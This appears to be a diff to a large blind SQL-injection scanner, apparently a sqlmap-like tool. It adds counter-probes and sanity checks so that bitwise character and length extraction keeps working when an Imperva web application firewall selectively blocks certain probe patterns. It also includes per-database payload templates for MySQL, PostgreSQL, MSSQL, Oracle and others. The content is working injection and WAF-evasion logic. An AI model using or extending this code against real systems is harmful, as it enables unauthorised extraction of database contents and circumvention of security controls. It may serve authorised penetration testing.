@@ -58094,11 +58094,22 @@ class Scanner:
                                       "equality denies %d, stripped=%d not printable → None",
                                       pos, _val, _val_stripped)
                             return None
+                    elif _char_eq_r is True:
+                        # RC-2 FIX (CRITICAL): Equality probe returned True while all hex-8
+                        # bits are set — this is WAF confirmation of garbage, NOT real data.
+                        # Imperva WAF blocks `ascii_fn=garbage_val` with hex-8 pattern and
+                        # returns status 400 (True signal), which masquerades as "confirmed".
+                        # Real confirmation is impossible here: if the equality probe is
+                        # blocked, True is indistinguishable from WAF-block. Return None so
+                        # the caller routes to _fallback_equality which uses safe operators.
+                        LOG.debug("[Inference] pos=%d bitwise WAF-hex8: equality probe True "
+                                  "while all-hex-8-bits set — WAF blocking equality for "
+                                  "garbage value %d; returning None", pos, _val)
+                        return None
                     elif _char_eq_r is None:
                         # Equality ambiguous — fall through conservatively (BROAD-4XX)
                         # Don't reject confirmed bit assembly if equality is indeterminate
                         pass
-                    # _char_eq_r is True → val confirmed, proceed normally
 
             # BUG-BITWISE-UNICODE-HI FIX: was `32 <= _val <= 255` — the 255 cap discarded
             # all non-Latin-1 Unicode characters (code points 256-65535 for MSSQL/Sybase,
@@ -58347,6 +58358,27 @@ class Scanner:
                             LOG.warning("[Inference] _get_length_bitwise: suspicious length "
                                         "%d failed equality verify — returning -1", _val)
                             return -1
+                    elif _eq_verify_r is True:
+                        # RC-3 FIX (CRITICAL): Equality probe returned True for a suspicious
+                        # length (>200 or all-hex-8 pattern). When _use_bitwise_fallback=True,
+                        # WAF blocks `LENGTH(query)=garbage_val` and returns status 400 (True).
+                        # This is indistinguishable from real SQL True. We cannot trust this
+                        # confirmation because the value was already flagged as suspicious.
+                        # Add a counter-probe using a guaranteed-false value (length=-1 is
+                        # impossible) to detect WAF broad-blocking of this length expression.
+                        _eq_counter_cond = f"{_len_fn}=-1"
+                        _eq_counter_r = await _eval(_eq_counter_cond)
+                        if _eq_counter_r is True:
+                            # WAF blocks ALL equality probes for this length function → garbage
+                            LOG.warning("[Inference] _get_length_bitwise: suspicious length "
+                                        "%d equality True but counter-probe (len=-1) also True "
+                                        "→ WAF broad-blocking length expression, returning -1",
+                                        _val)
+                            return -1
+                        # else: counter-probe False → WAF selective, original True was real
+                        LOG.debug("[Inference] _get_length_bitwise: suspicious length %d "
+                                  "verified by equality probe (counter-probe correctly False)",
+                                  _val)
 
             return _val if _val > 0 else -1  # -1 signals "unknown" (all bits zero = suspicious)
 
@@ -60315,10 +60347,27 @@ class Scanner:
                         _cap_verify_cond = f"{_cap_len_fn}={_length}"
                         _cap_verify_r = await _eval(_cap_verify_cond)
                         if _cap_verify_r is True:
-                            # Bitwise length matches equality probe → real length, keep it
-                            LOG.info("[Inference] %s: bitwise length=%d equals max_len and "
-                                     "equality probe confirms it is correct (not ceiling garbage)",
-                                     label, _length)
+                            # RC-4 FIX (CRITICAL): Equality probe True at max_len ceiling does
+                            # NOT confirm real length — WAF blocks `CHAR_LENGTH(user())=257`
+                            # and returns status 400 (True signal), masquerading as confirmed.
+                            # Counter-probe: length=-1 is always SQL-false (impossible length).
+                            # If WAF blocks ALL equality probes for this expression, the counter
+                            # also returns True → oracle is broken → cap conservatively.
+                            # If counter returns False → WAF is selective, original True is real.
+                            _cap_counter_cond = f"{_cap_len_fn}=-1"
+                            _cap_counter_r = await _eval(_cap_counter_cond)
+                            if _cap_counter_r is True:
+                                # WAF blocks ALL equality for this length fn → garbage length
+                                LOG.warning("[Inference] %s: bitwise length=%d hit max_len ceiling; "
+                                            "equality probe True but counter-probe (len=-1) also True "
+                                            "→ WAF broad-blocking length expression → capping at 32",
+                                            label, _length)
+                                _length = 32
+                            else:
+                                # Counter correctly False → WAF is not broad-blocking; True real
+                                LOG.info("[Inference] %s: bitwise length=%d equals max_len and "
+                                         "equality probe confirms it is correct (counter-probe "
+                                         "correctly False — not WAF garbage)", label, _length)
                         elif _cap_verify_r is False:
                             # Bitwise length is definitely wrong → cap conservatively
                             LOG.warning("[Inference] %s: bitwise length=%d hit max_len ceiling "
@@ -60740,6 +60789,67 @@ class Scanner:
                                         "BROAD-4XX guard cannot discriminate WAF-block from SQL-True "
                                         "for these masks. Switching to equality scan.", label, _bw_san_r)
                             _bitwise_oracle_sane = False
+                    if _bitwise_oracle_sane:
+                        # RC-1 FIX (CRITICAL): Third sanity probe — tests the EXACT form that
+                        # actual extraction probes use: `ascii_fn & 8 = 8` where mask=comparison=8.
+                        # Root cause: Imperva WAF selectively blocks `&mask=mask` when mask contains
+                        # hex digit '8' (masks 8, 128, 2048, 32768, 524288). The secondary probe
+                        # `&8=1` is NOT blocked by Imperva because comparison=1 contains no hex '8',
+                        # so it passes sanity and `_bitwise_oracle_sane` remains True. Actual
+                        # extraction then uses `ascii_fn&8=8`, `&128=128`, etc. → WAF blocks all of
+                        # these → returns status 400 (True signal) → all hex-8 bits set → garbage
+                        # chars like chr(0x88888) are assembled. This third probe uses pos=9999
+                        # (beyond any realistic string length) so ascii_fn→0. `0&8=0≠8` is
+                        # always SQL-false. If WAF blocks this `&8=8` form → returns True (400) →
+                        # sanity fails → extraction switches to equality scan (WAF-safe).
+                        _bw_san_ascii9999 = {
+                            "MySQL": f"ORD(MID(({query}),9999,1))",
+                            "MariaDB": f"ORD(MID(({query}),9999,1))",
+                            "TiDB": f"ORD(MID(({query}),9999,1))",
+                            "PostgreSQL": f"ASCII(SUBSTR(({query}),9999,1))",
+                            "CockroachDB": f"ASCII(SUBSTR(({query}),9999,1))",
+                            "YugabyteDB": f"ASCII(SUBSTR(({query}),9999,1))",
+                            "Amazon Redshift": f"ASCII(SUBSTR(({query}),9999,1))",
+                            "MSSQL": f"ISNULL(UNICODE(SUBSTRING(({query}),9999,1)),0)",
+                            "Sybase": f"ISNULL(UNICODE(SUBSTRING(({query}),9999,1)),0)",
+                            "Oracle": f"NVL(ASCII(SUBSTR(({query}),9999,1)),0)",
+                            "SQLite": f"COALESCE(UNICODE(SUBSTR(({query}),9999,1)),0)",
+                            "Firebird": f"COALESCE(ASCII_VAL(SUBSTRING(({query}) FROM 9999 FOR 1)),0)",
+                            "DB2": f"COALESCE(ASCII(SUBSTR(({query}),9999,1)),0)",
+                            "ClickHouse": f"ascii(substring(({query}),9999,1))",
+                        }.get(_dbms, f"COALESCE(ASCII(SUBSTRING(({query}),9999,1)),0)")
+                        # Build the `&8=8` form probe — always SQL-false (0&8=0≠8) but
+                        # triggers Imperva WAF selective blocking of hex-digit-8 mask=comparison.
+                        if _dbms == "Oracle":
+                            _bw_san_cond_m8x = f"BITAND({_bw_san_ascii9999},8)=8"
+                        elif _dbms == "Firebird":
+                            _bw_san_cond_m8x = f"BIN_AND({_bw_san_ascii9999},8)=8"
+                        elif _dbms == "ClickHouse":
+                            _bw_san_cond_m8x = f"bitAnd({_bw_san_ascii9999},8)=8"
+                        else:
+                            _bw_san_cond_m8x = f"{_bw_san_ascii9999}&8=8"
+                        _bw_san_m8x = await _cached_eval(_bw_san_cond_m8x)
+                        if _bw_san_m8x is True:
+                            # WAF blocked `&8=8` form → actual extraction probes (&8=8, &128=128,
+                            # etc.) will ALL be blocked and return True regardless of SQL result,
+                            # producing garbage chars with those exact bits set. Switch to equality.
+                            LOG.warning("[Inference] %s: BITWISE oracle sanity FAILED "
+                                        "(RC-1: hex-8 mask=comparison form &8=8 at pos=9999→True). "
+                                        "Imperva WAF selectively blocks '&mask=mask' patterns where "
+                                        "mask contains hex digit '8'. Actual extraction probes "
+                                        "(&8=8, &128=128, &2048=2048, &32768=32768, &524288=524288) "
+                                        "will be WAF-blocked producing garbage chars like chr(0x88888). "
+                                        "Switching to equality scan.", label)
+                            _bitwise_oracle_sane = False
+                        elif _bw_san_m8x is None:
+                            # Probe ambiguous — WAF may be partially blocking; treat as unsafe
+                            LOG.warning("[Inference] %s: BITWISE oracle sanity UNCERTAIN "
+                                        "(RC-1: hex-8 mask=comparison &8=8 at pos=9999→None). "
+                                        "WAF selective blocking of '&8=8' form cannot be ruled out. "
+                                        "Switching to equality scan to prevent garbage extraction.",
+                                        label)
+                            _bitwise_oracle_sane = False
+                        # _bw_san_m8x is False → WAF passes &8=8 form → extraction safe to proceed
                     if _bitwise_oracle_sane and _bw_san_r is None:
                         # PRIMARY probe ambiguous (blocked). Verify oracle health with always-true probe.
                         if _dbms == "Oracle":
